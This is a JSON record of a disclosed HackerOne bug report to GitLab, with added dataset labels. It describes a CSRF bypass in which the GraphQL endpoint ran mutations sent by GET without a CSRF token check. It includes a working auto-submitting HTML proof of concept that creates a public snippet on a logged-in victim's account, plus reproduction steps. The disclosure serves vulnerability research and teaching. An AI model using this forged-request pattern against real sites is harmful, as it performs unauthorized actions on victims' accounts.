{
    "reported_to": "GitLab",
    "reported_by": "az3z3l ",
    "title": "CSRF on /api/graphql allows executing mutations through GET requests",
    "content": "\nMutations are edit or create queries used in Graphql. Gitlab prevents CSRF in this functionality by sending a POST request with a X-CSRF-Token header. The bug I found here was that, when we send a GET request, the backend does not expect the X-CSRF-Token header. Using this, an attacker could leverage this to bypass the existing CSRF protection\nCode for Testing\nCode 1007 Bytes\n1<!DOCTYPE html>\n2<html lang=\"en\">\n3<head>\n4    <meta charset=\"UTF-8\">\n5    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n6    <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\">\n7    <meta name=\"referrer\" content=\"none\">\n8    <meta name=\"referrer\" content=\"no-referrer\">\n9</head>\n10<body>\n11      <form action=\"https://gitlab.com/api/graphql/\" id=\"csrf-form\" method=\"GET\">\n12        <input name=\"query\" value=\"mutation CreateSnippet($input: CreateSnippetInput!) {  createSnippet(input: $input) {    errors    snippet {      webUrl      __typename    }    needsCaptchaResponse    captchaSiteKey    __typename  }}\">\n13        <input name=\"variables\" value='{\"input\":{\"title\":\"Tesssst Snippet\",\"description\":\"Hello World\",\"visibilityLevel\":\"public\",\"blobActions\":[{\"action\":\"create\",\"previousPath\":\"readme.md\",\"content\":\"reading this.md\",\"filePath\":\"readme.md\"}],\"uploadedFiles\":[],\"projectPath\":\"\"}}'>\n14    </form>\n15\n16\n17    <script>document.getElementById(\"csrf-form\").submit()</script>\n18</body>\n19</html>\nThis exploit would create a snippet named Tesssst Snippet on the user's account.\nSteps to Reproduce\nHost this file\nLogin to gitlab\nOpen the link to that html\nCheck the snippets for the logged in user.\nImpact\nThe attacker could control bypass the existing CSRF check on the graphql endpoint.\nPOC\nAttached the request and response screenshot\nWhat is the expected correct behavior?\nThe backend must check the existence of csrf tokens for GET requests as well.\nImpact\nThe attacker could control bypass the existing CSRF check on the graphql endpoint.\n\n",
    "severity": [
        7.0,
        8.9
    ],
    "bounty": 3370,
    "weaknesses": [
        "Cross-Site Request Forgery (CSRF)"
    ],
    "screenshots": {},
    "disclosed_date": 1627945800,
    "report_url": "https://hackerone.com/reports/1122408",
    "is_multi_component": false,
    "complexity": "MEDIUM",
    "novelty": "MEDIUM",
    "vuln_category": "API",
    "steps": [
        [
            1,
            "Host the provided HTML file on a web server."
        ],
        [
            2,
            "Log in to GitLab and open the link to the hosted HTML file."
        ],
        [
            3,
            "Check the snippets section of the logged-in user's account for the newly created snippet."
        ]
    ],
    "vuln_description": "The vulnerability is a CSRF (Cross-Site Request Forgery) issue in GitLab's GraphQL endpoint (/api/graphql). It allows an attacker to execute mutations (edit or create operations) via GET requests, bypassing the CSRF protection that is enforced for POST requests. The backend does not check for the X-CSRF-Token header in GET requests, enabling this bypass.",
    "reason": "The attack is relatively straightforward, involving the creation of a simple HTML form that triggers a GET request to the vulnerable endpoint. The tester needed to understand GraphQL mutations and CSRF protections, but the interaction between these components is not particularly subtle or complex. The main insight was recognizing that the CSRF token check was omitted for GET requests.",
    "new_complexity": "LOW",
    "requires_code": false,
    "requires_CVE": false,
    "is_ctf": false,
    "other_report": null
}